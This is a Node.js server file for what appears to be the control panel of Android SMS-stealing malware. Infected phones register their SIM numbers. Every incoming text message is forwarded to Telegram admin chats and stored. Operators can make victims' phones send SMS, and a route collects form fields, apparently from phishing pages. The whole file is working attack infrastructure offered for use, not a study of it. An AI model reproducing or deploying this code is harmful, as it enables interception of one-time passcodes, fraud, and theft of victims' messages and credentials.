// server.js
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_IDS = (process.env.ADMIN_IDS || '-1002929812606')
  .split(',')
  .map(x => Number(x.trim()))
  .filter(Boolean);
const DEVELOPER = process.env.DEVELOPER || '@heck0bot';
const PORT = Number(process.env.PORT || 3000);

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== EXPRESS & BOT =====
const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME =====
const devices = new Map();            // uuid -> { model, battery, sim1, sim2, lastSeen }
const notifiedDevices = new Set();    // uuids already notified on first connect
const sessions = {};                  // chatId -> { stage, uuid, sim, to, expiresAt }
const lastActionAt = new Map();       // simple rate-limit per admin

// ===== HELPERS =====
function now() { return Date.now(); }

function rateLimited(chatId, ms = 500) {
  const last = lastActionAt.get(chatId) || 0;
  if (now() - last < ms) return true;
  lastActionAt.set(chatId, now());
  return false;
}

function isAdmin(chatId) { return ADMIN_IDS.includes(chatId); }

function readJsonSafe(file, fallback) {
  try { return fs.readJsonSync(file, { throws: false }) ?? fallback; }
  catch { return fallback; }
}

function safeWrite(file, data) {
  const tmp = file + '.tmp';
  fs.writeJsonSync(tmp, data, { spaces: 2 });
  fs.renameSync(tmp, file);
}

function readQueue() { return readJsonSafe(QUEUE_FILE, {}); }
function writeQueue(q) { safeWrite(QUEUE_FILE, q); }

function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}

function formatDevice(d) {
  const online = (now() - (d.lastSeen || 0) < 60_000);
  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'}\n🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 Battery: ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}

function fmtDate(ts) {
  try {
    // India locale; fallback to default if not available
    return new Date(ts).toLocaleString('en-IN', {
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit',
      hour12: true
    });
  } catch {
    const d = new Date(ts);
    return d.toISOString();
  }
}

function smsPrettyBlock(device, sms) {
  return [
    '📱 NEW MESSAGE RECEIVED 📱',
    '',
    '📜 Device Numbers 📜',
    '================================',
    `• Model: ${device.model || 'Unknown'}`,
    `🪪 SIM1: ${device.sim1 || 'Not Found'}`,
    `🪪 SIM2: ${device.sim2 || 'Not Found'}`,
    '',
    '🃏 Message Details 🃏',
    '================================',
    `• From: ${sms.from}`,
    `📧 Message Preview: ${sms.body}`,
    `⏳ TimeStamp: ${fmtDate(sms.timestamp)}`
  ].join('\n');
}

function sanitizePhone(n) {
  if (!n) return '';
  const s = String(n).replace(/[^\d+]/g, '');
  // allow +country or plain digits, length sanity check
  if (!/^\+?\d{8,15}$/.test(s)) return '';
  return s;
}

function ensureSession(chatId) {
  const s = sessions[chatId];
  if (!s) return null;
  if (s.expiresAt && now() > s.expiresAt) {
    delete sessions[chatId];
    return null;
  }
  return s;
}

function extendSession(chatId, ms = 90_000) {
  if (!sessions[chatId]) return;
  sessions[chatId].expiresAt = now() + ms;
}

function devicesInlineRows(prefix) {
  return [...devices.entries()].map(([uuid, d]) => ([{
    text: d.model || uuid, callback_data: `${prefix}:${uuid}`
  }]));
}

function smsFilePath(uuid) { return path.join(STORAGE_DIR, `${uuid}_sms.json`); }

function getSmsSlice(uuid, offset = 0, limit = 20) {
  const list = readJsonSafe(smsFilePath(uuid), []);
  return {
    total: list.length,
    items: list.slice(offset, offset + limit),
  };
}

// ===== ROUTES =====
app.get('/', (_, res) => res.send('✅ Panel online'));

app.post('/connect', (req, res) => {
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: now() });

  if (!notifiedDevices.has(uuid)) {
    const payload = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨💻 Developer: ${DEVELOPER}`;
    ADMIN_IDS.forEach(id => bot.sendMessage(id, payload, { parse_mode: 'Markdown' }).catch(() => {}));
    notifiedDevices.add(uuid);
  }
  res.sendStatus(200);
});

app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');

  // heartbeat for online
  if (devices.has(uuid)) devices.get(uuid).lastSeen = now();

  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

// Receive SMS
app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = timestamp ? Number(timestamp) : now();

  // Notify admins (pretty)
  const pretty = smsPrettyBlock(device, {
    from, body, timestamp: ts
  });
  ADMIN_IDS.forEach(id => bot.sendMessage(id, '```\n' + pretty + '\n```', { parse_mode: 'Markdown' }).catch(() => {}));

  // Store
  const file = smsFilePath(uuid);
  const list = readJsonSafe(file, []);
  list.unshift({ from, body, sim, battery, timestamp: ts });
  safeWrite(file, list.slice(0, 500)); // keep last 500
  res.sendStatus(200);
});

// Device sends back a status after sending an SMS
app.post('/sms-status', (req, res) => {
  const { uuid, to, message, status, error } = req.body;
  const device = devices.get(uuid) || { model: uuid };
  const text = status === 'sent'
    ? `✅ *SMS Sent*\n📱 Device: ${device.model}\nTo: ${to}\nMessage: ${message}`
    : `❌ *SMS Failed*\n📱 Device: ${device.model}\nTo: ${to}\nError: ${error || 'Unknown'}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, text, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

// Optional: form data receiver (kept from your previous code)
app.post('/html-form-data', (req, res) => {
  const { uuid, ...fields } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
  safeWrite(fp, fields);

  const device = devices.get(uuid) || { model: uuid, brand: 'Unknown', battery: 'N/A' };
  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🏷 Brand: ${device.brand}\n🔋 Battery: ${device.battery || 'N/A'}%\n`;
  for (let [k, v] of Object.entries(fields)) {
    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
    msg += `🔸 *${label}*: ${v}\n`;
  }
  msg += `\n👨💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

// ===== TELEGRAM BOT: commands & menus =====
bot.on('message', msg => {
  const chatId = msg.chat.id;
  const textRaw = (msg.text || '').trim();
  const text = textRaw.toLowerCase();

  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Permission denied.');
    return;
  }
  if (rateLimited(chatId)) return;

  // sessions handling (multi-step for send sms)
  const s = ensureSession(chatId);
  if (s) {
    if (text === 'cancel' || text === '/cancel') {
      delete sessions[chatId];
      bot.sendMessage(chatId, '❎ Cancelled.');
      return;
    }
    switch (s.stage) {
      case 'await_number': {
        const num = sanitizePhone(textRaw);
        if (!num) {
          extendSession(chatId);
          return bot.sendMessage(chatId, '⚠️ Invalid number. Send in international or local digits (8–15). Or type *cancel*.', { parse_mode: 'Markdown' });
        }
        s.to = num;
        s.stage = 'await_message';
        extendSession(chatId);
        bot.sendMessage(chatId, '✍️ Enter message text (max 1000 chars). Or type *cancel*.', { parse_mode: 'Markdown' });
        return;
      }
      case 'await_message': {
        const msgText = textRaw.slice(0, 1000);
        addCommand(s.uuid, { type: 'send_sms', sim: s.sim, to: s.to, message: msgText });
        bot.sendMessage(chatId, `📤 SMS queued\n📱 Device: ${devices.get(s.uuid)?.model || s.uuid}\n🪪 SIM: ${s.sim}\nTo: ${s.to}\n📝 Message: ${msgText}`);
        delete sessions[chatId];
        return;
      }
    }
  }

  // root commands
  if (text === '/start') {
    bot.sendMessage(chatId, '✅ Admin Panel Ready', {
      reply_markup: {
        keyboard: [['Connected devices'], ['Send SMS'], ['Receive SMS']],
        resize_keyboard: true
      }
    });
    return;
  }

  if (text === 'connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    let out = '';
    for (let [u, d] of devices.entries())
      out += `${formatDevice(d)}\nUUID: \`${u}\`\n\n`;
    bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
    return;
  }

  if (text === 'send sms') {
    const rows = devicesInlineRows('send_sms_device');
    if (rows.length === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    bot.sendMessage(chatId, '📤 Select device to send SMS:', { reply_markup: { inline_keyboard: rows } });
    return;
  }

  if (text === 'receive sms') {
    // Show last 20 for ALL devices with "More" buttons per device
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    for (let [uuid, d] of devices.entries()) {
      const { items, total } = getSmsSlice(uuid, 0, 20);
      if (items.length === 0) {
        bot.sendMessage(chatId, `📭 No SMS for *${d.model || uuid}*`, { parse_mode: 'Markdown' });
        continue;
      }
      let block = `📚 *Last ${Math.min(20, total)} of ${total} - ${d.model || uuid}*\n================================\n`;
      items.forEach((s, i) => {
        block += `#${i + 1}\nFrom: ${s.from}\n${s.body}\nTime: ${fmtDate(s.timestamp)}\n\n`;
      });
      const inline_keyboard = [];
      if (total > 20) inline_keyboard.push([{ text: 'Next 20 ➡️', callback_data: `sms_list:${uuid}:20` }]);
      bot.sendMessage(chatId, block, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
    }
    return;
  }
});

// Inline callbacks (send sms flow + sms pagination)
bot.on('callback_query', cb => {
  const chatId = cb.message.chat.id;
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });

  const data = cb.data || '';
  const [cmd, uuid, param] = data.split(':');

  switch (cmd) {
    // Send SMS flow
    case 'send_sms_device': {
      const d = devices.get(uuid);
      if (!d) {
        bot.answerCallbackQuery(cb.id, { text: 'Device offline/unavailable' });
        return;
      }
      const row = [
        { text: 'SIM1', callback_data: `send_sms_sim:${uuid}:1` },
        { text: 'SIM2', callback_data: `send_sms_sim:${uuid}:2` }
      ];
      bot.editMessageText(`📤 Choose SIM for ${d.model || uuid}:`, {
        chat_id: chatId, message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [row] }
      }).catch(() => {});
      bot.answerCallbackQuery(cb.id);
      return;
    }
    case 'send_sms_sim': {
      const sim = Number(param) === 2 ? 2 : 1;
      sessions[chatId] = { stage: 'await_number', uuid, sim, expiresAt: now() + 90_000 };
      bot.sendMessage(chatId, `📱 Enter number to send SMS (SIM${sim}). Type *cancel* to abort.`, { parse_mode: 'Markdown' });
      bot.answerCallbackQuery(cb.id);
      return;
    }

    // Pagination for SMS list
    case 'sms_list': {
      const offset = Math.max(0, Number(param) || 0);
      const d = devices.get(uuid) || { model: uuid };
      const { items, total } = getSmsSlice(uuid, offset, 20);

      if (items.length === 0) {
        bot.answerCallbackQuery(cb.id, { text: 'No more messages.' });
        return;
      }
      let head = `📚 *Messages ${offset + 1}-${Math.min(offset + 20, total)} of ${total} - ${d.model}*\n================================\n`;
      let text = head;
      items.forEach((s, i) => {
        text += `#${offset + i + 1}\nFrom: ${s.from}\n${s.body}\nTime: ${fmtDate(s.timestamp)}\n\n`;
      });

      const nav = [];
      if (offset > 0) nav.push({ text: '⬅️ Prev 20', callback_data: `sms_list:${uuid}:${Math.max(0, offset - 20)}` });
      if (offset + 20 < total) nav.push({ text: 'Next 20 ➡️', callback_data: `sms_list:${uuid}:${offset + 20}` });

      // edit existing message if possible, else send new
      bot.editMessageText(text, {
        chat_id: chatId, message_id: cb.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: nav.length ? [nav] : [] }
      }).catch(() => {
        bot.sendMessage(chatId, text, {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: nav.length ? [nav] : [] }
        });
      });
      bot.answerCallbackQuery(cb.id);
      return;
    }
  }
});

// Cleanup inactive devices every minute (5 min threshold)
setInterval(() => {
  const t = now();
  for (let [uuid, d] of devices) {
    if (t - (d.lastSeen || 0) > 5 * 60_000) {
      devices.delete(uuid);
      notifiedDevices.delete(uuid);
      console.log(`🗑 Removed inactive device: ${uuid}`);
    }
  }
}, 60_000);

// Start
app.listen(PORT, () => console.log(`✅ Dev server running on port ${PORT}`));
